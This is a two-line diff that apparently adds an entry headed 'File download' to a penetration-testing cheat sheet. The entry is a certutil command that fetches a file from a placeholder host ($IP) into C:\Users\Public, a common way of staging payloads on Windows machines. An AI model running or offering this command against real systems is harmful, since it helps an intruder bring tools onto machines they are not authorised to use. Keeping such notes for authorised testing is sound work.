@@ -1,1 +1,2 @@
-./certutil
+# File download
+certutil -urlcache -f -split http://$IP/foo C:\Users\Public\foo
